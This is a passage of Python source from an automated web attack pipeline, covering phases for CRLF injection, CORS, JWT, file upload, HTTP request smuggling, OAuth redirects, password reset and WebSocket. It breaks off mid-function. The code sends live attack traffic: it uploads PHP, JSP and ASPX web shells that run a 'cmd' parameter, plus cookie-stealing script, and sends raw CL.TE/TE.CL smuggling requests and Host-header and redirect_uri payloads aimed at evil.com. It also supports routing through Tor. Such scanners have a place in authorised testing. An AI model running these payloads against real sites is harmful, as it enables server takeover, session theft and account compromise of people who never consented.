    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"33-CRLF"}:
        return {}
    _out = outdir / "crlf_injection.txt"
    if _out.exists() and not force:
        return {"33-CRLF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "33-CRLF: no URLs; skipping")
        return {"33-CRLF": str(_out), "count": 0}
    findings: List[str] = []
    _crlf_urlopen = _get_urlopener()
    _crlf_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_crlf]
    if t.has("crlfuzz") and param_urls:
        crlfuzz_in = ensure(outdir / "crlfuzz_input.txt")
        crlfuzz_in.write_text("\n".join(param_urls) + "\n")
        crlfuzz_out = outdir / "crlfuzz_results.txt"
        runner = outdir / "logs" / "crlfuzz_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(crlfuzz_in))}\n"
            f"OUT={shlex.quote(str(crlfuzz_out))}\n"
            'crlfuzz -l "$IN" -o "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        await _run("crlfuzz", ["bash", str(runner)], 600, outdir)
        if crlfuzz_out.exists() and read_lines(crlfuzz_out):
            for ln in read_lines(crlfuzz_out):
                findings.append(f"[crlfuzz] {ln.strip()}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            for payload, indicator in _CRLF_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers})
                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(_crlf_urlopen, req, timeout=10)
                    body_str = resp_body.decode("utf-8", errors="ignore")
                    if indicator in body_str:
                        findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} reflected")
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        if indicator in body:
                            findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} in error body")
                    except Exception:
                        pass
                except Exception:
                    continue
    if not findings:
        findings.append("[crlf] No CRLF injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
    return {"33-CRLF": str(out), "count": len(findings)}


# ────────────────── Phase 34-RATELIMIT: Rate Limiting Detection ─────────────────
async def phase_34_RATELIMIT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"34-RATELIMIT"}:
        return {}
    _out = outdir / "rate_limiting.txt"
    if _out.exists() and not force:
        return {"34-RATELIMIT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "34-RATELIMIT: no URLs; skipping")
        return {"34-RATELIMIT": str(_out), "count": 0}
    findings: List[str] = []
    _rl_urlopen = _get_urlopener()
    _rl_extra_headers = _extra_headers_dict()
    _burst_size = 10 if (_PIPELINE_CFG.proxy or _USE_PROXYCHAINS) else 50
    login_targets = [u for u in all_urls if any(m in u.lower() for m in
        ("/login", "/signin", "/auth", "/oauth", "/token", "/api/"))][:_PIPELINE_CFG.sample_hosts_ratelimit]
    if not login_targets:
        login_targets = all_urls[:_PIPELINE_CFG.sample_hosts_ratelimit]
    for url in login_targets:
        try:
            statuses: List[int] = []
            for _ in range(_burst_size):
                await _throttle_rate()
                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers})
                s, resp_h, _ = await _async_urlopen_no_redirect(_rl_urlopen, req, timeout=8)
                statuses.append(s)
                if s in (429, 503) or "retry-after" in str(resp_h).lower():
                    findings.append(f"[rate-limit-detected] {url} — rate limited after {len(statuses)} requests (HTTP {s})")
                    break
            else:
                unique_st = len(set(statuses))
                if len(statuses) >= _burst_size and unique_st <= 1:
                    findings.append(f"[rate-limit-missing] {url} — no rate limiting after {_burst_size} requests")
        except Exception:
            continue
    if not findings:
        findings.append("[rate-limit] No rate limiting checks completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
    return {"34-RATELIMIT": str(out), "count": len(findings)}


# ────────────────── Phase 35-CORSADV: Advanced CORS Testing ────────────────────
async def phase_35_CORSADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"35-CORSADV"}:
        return {}
    _out = outdir / "cors_advanced.txt"
    if _out.exists() and not force:
        return {"35-CORSADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
    findings: List[str] = []
    _cors_urlopen = _get_urlopener()
    _cors_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_endpoints = list({u.split("?")[0] for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql"))})[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        api_endpoints = list({u.split("?")[0] for u in all_urls})[:_PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        log("warn", "35-CORSADV: no endpoints; skipping")
        return {"35-CORSADV": str(_out), "count": 0}
    # Corsy CORS misconfiguration scanner
    if t.has("corsy") and api_endpoints:
        corsy_in = ensure(outdir / "corsy_input.txt")
        corsy_in.write_text("\n".join(api_endpoints) + "\n")
        corsy_out = outdir / "corsy_results.txt"
        runner = outdir / "logs" / "corsy_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(corsy_in))}\n"
            f"OUT={shlex.quote(str(corsy_out))}\n"
            'corsy -i "$IN" -o "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        await _run("corsy", ["bash", str(runner)], 600, outdir)
        if corsy_out.exists() and read_lines(corsy_out):
            for ln in read_lines(corsy_out):
                findings.append(f"[corsy] {ln.strip()}")
    _CORS_TEST_ORIGINS = [
        "https://evil.com",
        "https://sub.evil.com",
        "null",
        "https://evil.com:8080",
        "https://evil.com.evil2.com",
        "https://evil.com%2f.evil2.com",
    ]
    async def _check_cors_origin(url: str, origin: str) -> Optional[str]:
        try:
            req = urllib.request.Request(url, method="OPTIONS",
                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers})
            _, ch, _ = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
            acao = ch.get("Access-Control-Allow-Origin", "")
            acac = ch.get("Access-Control-Allow-Credentials", "")
            acm = ch.get("Access-Control-Allow-Methods", "")
            ach = ch.get("Access-Control-Allow-Headers", "")
            if origin in acao or "*" in acao:
                creds = " with credentials" if acac == "true" else ""
                return f"[cors-misconfig] {url} ACAO={acao} origin={origin}{creds}"
            if origin and origin in str(ch).lower():
                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers"
        except Exception:
            pass
        return None
    cors_results = await asyncio.gather(*[_check_cors_origin(ep, o)
        for ep in api_endpoints for o in _CORS_TEST_ORIGINS])
    for r in cors_results:
        if r:
            findings.append(r)
    if not findings:
        findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
    return {"35-CORSADV": str(out), "count": len(findings)}


# ────────────────── Phase 36-JWTADV: Advanced JWT Attacks ──────────────────────
_JWTADV_WEAK_KEYS = ["secret", "password", "12345", "key", "admin", "changeme", "secretkey", "jwt_secret", "secret123", "test", "demo"]


async def phase_36_JWTADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"36-JWTADV"}:
        return {}
    _out = outdir / "jwt_advanced.txt"
    if _out.exists() and not force:
        return {"36-JWTADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 36-JWTADV: advanced JWT security analysis")
    findings: List[str] = []
    _ja_urlopen = _get_urlopener()
    _ja_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    targets = [u for u in all_urls if any(m in u.lower() for m in
        ("/api/", "/auth", "/token", "/jwt", "/login", "/oauth"))][:_PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        targets = all_urls[:_PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        log("warn", "36-JWTADV: no targets; skipping")
        return {"36-JWTADV": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_ja_extra_headers})
            _, resp_h, resp_body = await _async_urlopen(_ja_urlopen, req, timeout=10)
            body = resp_body.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in resp_h.items())
            for m in re.finditer(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    hdr_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    pld_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(hdr_b64))
                    payload = json.loads(base64.urlsafe_b64decode(pld_b64))
                    signature = base64.urlsafe_b64decode(sig_b64)
                    alg = header.get("alg", "")
                    findings.append(f"[jwt-token] {url} alg={alg} sub={payload.get('sub','?')}")
                    if not signature or signature == b"":
                        findings.append(f"[jwt-no-sig] {url} — empty signature")
                    if alg == "none":
                        findings.append(f"[jwt-confirm-none] {url} — alg=none accepted (CRITICAL)")
                    if "kid" in header:
                        kid = header["kid"]
                        findings.append(f"[jwt-kid] {url} kid={kid}")
                        if "/" in kid or ".." in kid or "\\" in kid:
                            findings.append(f"[jwt-kid-traversal] {url} — KID contains path traversal: {kid}")
                    if "jku" in header:
                        jku = header["jku"]
                        findings.append(f"[jwt-jku] {url} jku={jku}")
                        if not jku.startswith("https://"):
                            findings.append(f"[jwt-jku-unsafe] {url} — JKU not HTTPS: {jku}")
                    if "jwk" in header:
                        findings.append(f"[jwt-jwk-embedded] {url} — JWK embedded in header (attacker-controllable)")
                    if "x5u" in header:
                        findings.append(f"[jwt-x5u] {url} — x5u embedded: {header['x5u']}")
                    if alg == "RS256":
                        findings.append(f"[jwt-alg-confusion-candidate] {url} — RS256→HS256 confusion test needed")
                    if not signature or len(signature) < 10:
                        findings.append(f"[jwt-weak-sig] {url} — unusually short signature ({len(signature)} bytes)")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[jwtadv] No JWT tokens found for advanced analysis")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"36-JWTADV: {len(findings)} JWT analysis findings -> {out}")
    return {"36-JWTADV": str(out), "count": len(findings)}


# ────────────────── Phase 37-FILEUPLOAD: File Upload Vuln Testing ──────────────
_FILEUPLOAD_TEST_FILES = [
    ("php_webshell.php", "<?php system($_GET['cmd']); ?>", "text/plain"),
    ("test.jsp", "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>", "text/plain"),
    ("test.aspx", "<%@ Page Language=\"C#\" %><%= Request.QueryString[\"cmd\"] %>", "text/plain"),
    ("test.php5", "<?php echo 'test'; ?>", "image/jpeg"),
    ("test.phtml", "<?php echo 'test'; ?>", "image/png"),
    ("test.cgi", "#!/bin/bash\necho 'test'", "text/plain"),
    ("test.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", "image/svg+xml"),
    ("test.html", "<script>alert(document.cookie)</script>", "text/html"),
    ("test.htaccess", "AddType application/x-httpd-php .txt", "text/plain"),
    ("test.zip", "PK", "application/zip"),
]


async def phase_37_FILEUPLOAD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"37-FILEUPLOAD"}:
        return {}
    _out = outdir / "file_upload.txt"
    if _out.exists() and not force:
        return {"37-FILEUPLOAD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
    findings: List[str] = []
    upload_urlopen = _get_urlopener()
    _fu_extra_headers = _extra_headers_dict()
    upload_candidates: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            low = u.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(u.split("?")[0])
    fuzz_file = outdir / "fuzz.txt"
    if fuzz_file.exists():
        for ln in read_lines(fuzz_file):
            low = ln.lower()
            if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
                upload_candidates.add(ln.split("\t")[-1] if "\t" in ln else (ln.split()[0] if " " in ln else ln))
    targets = list(upload_candidates)[:_PIPELINE_CFG.sample_urls_upload]
    if not targets:
        log("warn", "37-FILEUPLOAD: no upload endpoints found; skipping")
        return {"37-FILEUPLOAD": str(_out), "count": 0}
    for ep in targets:
        for fname, content, content_type in _FILEUPLOAD_TEST_FILES:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: {content_type}\r\n\r\n"
                    f"{content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0", **_fu_extra_headers,
                    })
                up_status, _, up_body = await _async_urlopen(upload_urlopen, req, timeout=15)
                up_text = up_body.decode("utf-8", errors="ignore").lower()
                if up_status in (200, 201, 302, 301):
                    findings.append(f"[upload-accepted] {ep} file={fname} type={content_type} -> HTTP {up_status}")
                if fname in up_text or fname.replace(".", "_") in up_text:
                    findings.append(f"[upload-stored] {ep} file={fname} reflected in response -> possible stored access")
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 405, 413, 415, 501):
                    findings.append(f"[upload-response] {ep} file={fname} -> HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[fileupload] No upload vulnerabilities detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
    return {"37-FILEUPLOAD": str(out), "count": len(findings)}


# ────────────────── Phase 38-SMUGGLE: HTTP Request Smuggling ───────────────────
_SMUGGLE_CL_TE_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 0\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)
_SMUGGLE_TE_CL_PAYLOAD = (
    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST /smuggle-test HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


async def phase_38_SMUGGLE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"38-SMUGGLE"}:
        return {}
    _out = outdir / "smuggling.txt"
    if _out.exists() and not force:
        return {"38-SMUGGLE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 38-SMUGGLE: HTTP request smuggling detection")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "38-SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    findings: List[str] = []
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_smuggle]
    if not targets:
        log("warn", "38-SMUGGLE: no hosts; skipping")
        return {"38-SMUGGLE": str(_out), "count": 0}
    # Smuggler tool (Python-based request smuggler)
    if t.has("smuggler"):
        smuggler_in = ensure(outdir / "smuggler_input.txt")
        smuggler_urls = []
        for h in targets:
            if h.startswith("http"):
                smuggler_urls.append(h)
            else:
                smuggler_urls.append(f"https://{h}")
        smuggler_in.write_text("\n".join(smuggler_urls) + "\n")
        smuggler_out = outdir / "logs" / "smuggler_results"
        smuggler_out.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "smuggler_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(smuggler_in))}\n"
            f"OUT={shlex.quote(str(smuggler_out))}\n"
            'smuggler -l "$IN" -o "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        await _run("smuggler", ["bash", str(runner)], 600, outdir)
        smuggler_reports = list(smuggler_out.glob("*.txt"))
        if smuggler_reports:
            for rpt in smuggler_reports:
                for ln in read_lines(rpt):
                    if ln.strip():
                        findings.append(f"[smuggler] {ln.strip()}")
    for host in targets:
        host_clean = host.split(":")[0] if ":" in host else host
        host_safe = host_clean.replace("\r", "").replace("\n", "").replace("{", "{{").replace("}", "}}")
        try:
            import socket as _socket
            for smuggle_type, raw_payload in [("CL.TE", _SMUGGLE_CL_TE_PAYLOAD), ("TE.CL", _SMUGGLE_TE_CL_PAYLOAD)]:
                payload = raw_payload.format(host=host_safe)
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(8)
                try:
                    port = 443 if "https" in str(host) else 80
                    if ":" in host:
                        try:
                            port = int(host.split(":")[1])
                        except (ValueError, IndexError):
                            pass
                    import ssl as _ssl
                    if port == 443:
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host_clean)
                    sock.connect((host_clean, port))
                    sock.sendall(payload.encode())
                    resp = b""
                    try:
                        while True:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                    except _socket.timeout:
                        pass
                    sock.close()
                    resp_text = resp.decode("utf-8", errors="ignore")
                    if "smuggle-test" in resp_text.lower() or "gpo" in resp_text.lower():
                        findings.append(f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type})")
                    elif resp and "HTTP/1.1" in resp_text:
                        findings.append(f"[smuggling-tested] {host} — {smuggle_type} test sent, no desync (expected)")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[smuggling] No request smuggling candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"38-SMUGGLE: {len(findings)} smuggling probes -> {out}")
    return {"38-SMUGGLE": str(out), "count": len(findings)}


# ────────────────── Phase 39-OAUTH: OAuth Misconfiguration Testing ─────────────
_OAUTH_ENDPOINTS = [
    "/oauth/authorize", "/oauth/token", "/oauth/v2/authorize", "/oauth/v2/token",
    "/oauth2/authorize", "/oauth2/token", "/oauth2/v1/authorize", "/oauth2/v1/token",
    "/auth", "/token", "/authorize", "/connect/token", "/connect/authorize",
    "/api/oauth/token", "/api/oauth/authorize",
]


async def phase_39_OAUTH(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"39-OAUTH"}:
        return {}
    _out = outdir / "oauth_misconfig.txt"
    if _out.exists() and not force:
        return {"39-OAUTH": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 39-OAUTH: OAuth misconfiguration testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform OAuth testing
    jwt_file = outdir / "jwt_analysis.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:10]:
                findings.append(f"[from-jwt] {jf}")
    _oa_urlopen = _get_urlopener()
    _oa_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{h}" if not h.startswith("http") else h
             for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not hosts:
        log("warn", "39-OAUTH: no hosts; skipping")
        return {"39-OAUTH": str(_out), "count": 0}
    endpoints_to_test: List[str] = []
    for base in hosts:
        for oauth_ep in _OAUTH_ENDPOINTS:
            endpoints_to_test.append(base.rstrip("/") + oauth_ep)
    endpoints_to_test = endpoints_to_test[:_PIPELINE_CFG.sample_endpoints_oauth * 5]
    async def _probe_oauth(ep_url: str) -> Optional[str]:
        try:
            req = urllib.request.Request(ep_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s, h, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
            if s in (200, 201, 302, 301, 405):
                body_text = ""
                if s not in (302, 301):
                    try:
                        req2 = urllib.request.Request(ep_url, method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
                        _, _, b2 = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
                        body_text = b2.decode("utf-8", errors="ignore")
                    except Exception:
                        pass
                return f"[oauth-endpoint] {ep_url} -> HTTP {s}"
            return None
        except Exception:
            return None
    ep_results = await asyncio.gather(*[_probe_oauth(ep) for ep in endpoints_to_test])
    for r in ep_results:
        if r:
            findings.append(r)
    for ep_url in [ep for ep in endpoints_to_test if any(m in ep.lower() for m in ("authorize",))]:
        try:
            req = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com&scope=openid",
                method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s, rh, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
            loc = rh.get("Location", "")
            if "evil.com" in loc:
                findings.append(f"[oauth-open-redirect] {ep_url} — redirect_uri accepted https://evil.com")
            req2 = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com%2f.evil2.com&scope=openid",
                method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s2, rh2, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
            loc2 = rh2.get("Location", "")
            if "evil2.com" in loc2:
                findings.append(f"[oauth-redirect-bypass] {ep_url} — redirect_uri parser bypass: %2f.evil2.com")
        except urllib.error.HTTPError as e:
            loc3 = e.headers.get("Location", "")
            if "evil.com" in loc3 or "evil2.com" in loc3:
                findings.append(f"[oauth-redirect-error] {ep_url} -> HTTP {e.code} Location={loc3}")
        except Exception:
            continue
    if not findings:
        findings.append("[oauth] No OAuth endpoints found or no misconfigurations detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"39-OAUTH: {len(findings)} OAuth probes -> {out}")
    return {"39-OAUTH": str(out), "count": len(findings)}


# ────────────────── Phase 40-PWRESET: Password Reset Logic ─────────────────────
_PWRESET_ENDPOINTS = [
    "/reset", "/reset-password", "/forgot", "/forgot-password",
    "/password/reset", "/password/forgot", "/api/reset", "/api/forgot",
    "/password-reset", "/account/reset", "/user/reset",
]
_PWRESET_EMAIL_PARAMS = ["email", "user", "username", "account", "userid", "user_id"]


async def phase_40_PWRESET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"40-PWRESET"}:
        return {}
    _out = outdir / "password_reset.txt"
    if _out.exists() and not force:
        return {"40-PWRESET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 40-PWRESET: password reset logic testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform password reset testing
    jwt_file = outdir / "jwt_analysis.txt"
    jwt_adv_file = outdir / "jwt_advanced.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:5]:
                findings.append(f"[from-jwt] {jf}")
    if jwt_adv_file.exists():
        jwt_adv_findings = read_lines(jwt_adv_file)
        if jwt_adv_findings:
            for jaf in jwt_adv_findings[:5]:
                findings.append(f"[from-jwtadv] {jaf}")
    _pw_urlopen = _get_urlopener()
    _pw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{h}" if not h.startswith("http") else h
             for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not hosts:
        log("warn", "40-PWRESET: no hosts; skipping")
        return {"40-PWRESET": str(_out), "count": 0}
    endpoints = []
    for base in hosts:
        for ep in _PWRESET_ENDPOINTS:
            endpoints.append(base.rstrip("/") + ep)
    for ep_url in endpoints[:_PIPELINE_CFG.sample_endpoints_pwreset]:
        try:
            req = urllib.request.Request(ep_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_pw_extra_headers})
            s, h, b = await _async_urlopen_no_redirect(_pw_urlopen, req, timeout=8)
            body_text = b.decode("utf-8", errors="ignore")
            if s in (200, 201, 302, 301):
                findings.append(f"[pwreset-endpoint] {ep_url} -> HTTP {s}")
                for pname in _PWRESET_EMAIL_PARAMS:
                    test_url = ep_url + (("?" if "?" not in ep_url else "&") + f"{pname}=victim@evil.com&{pname}=attacker@evil.com")
                    try:
                        req2 = urllib.request.Request(test_url, method="POST",
                            data=b"email=attacker@evil.com",
                            headers={"Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": "Mozilla/5.0", **_pw_extra_headers})
                        s2, _, b2 = await _async_urlopen_no_redirect(_pw_urlopen, req2, timeout=8)
                        if s2 in (200, 201, 302):
                            findings.append(f"[pwreset-param-pollution] {ep_url} — {pname} accepts email param")
                    except urllib.error.HTTPError:
                        pass
                    except Exception:
                        continue
                try:
                    host_inject_req = urllib.request.Request(ep_url, method="POST",
                        data=b"email=test@test.com",
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "Host": "evil.com", **_pw_extra_headers})
                    s3, h3, _ = await _async_urlopen_no_redirect(_pw_urlopen, host_inject_req, timeout=8)
                    loc = h3.get("Location", "") or h3.get("location", "")
                    if "evil.com" in loc:
                        findings.append(f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc}")
                except urllib.error.HTTPError as e:
                    loc = e.headers.get("Location", "") or e.headers.get("location", "")
                    if "evil.com" in loc:
                        findings.append(f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc} (HTTP {e.code})")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[pwreset] No password reset endpoints or logic issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"40-PWRESET: {len(findings)} password reset probes -> {out}")
    return {"40-PWRESET": str(out), "count": len(findings)}


# ────────────────── Phase 41-WEBSOCKET: WebSocket Security Testing ─────────────
_WS_COMMON_PATHS = ["/ws", "/wss", "/websocket", "/socket", "/sock", "/chat", "/stream", "/ws/"]


async def phase_41_WEBSOCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"41-WEBSOCKET"}:
        return {}
    _out = outdir / "websocket.txt"
    if _out.exists() and not force:
        return {"41-WEBSOCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 41-WEBSOCKET: WebSocket endpoint discovery and testing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "41-WEBSOCKET: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}
    findings: List[str] = []
    _ws_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_websocket]
    if not hosts:
        log("warn", "41-WEBSOCKET: no hosts; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}
    for host in hosts:
        host_clean = host.split(":")[0] if ":" in host else host
        for ws_path in _WS_COMMON_PATHS:
            ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
